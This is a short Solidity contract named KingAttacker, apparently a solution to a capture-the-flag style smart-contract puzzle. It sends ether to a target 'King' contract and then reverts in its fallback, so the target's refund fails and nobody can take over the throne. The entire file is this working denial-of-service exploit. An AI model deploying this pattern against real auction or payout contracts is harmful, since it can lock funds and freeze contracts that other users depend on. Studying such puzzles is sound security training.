// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttacker {

    constructor() public payable{

    }

    function attack(address payable addr) public payable{
        addr.call.value(msg.value)("");
    }
    
    fallback() external payable{
        revert();
    }

} 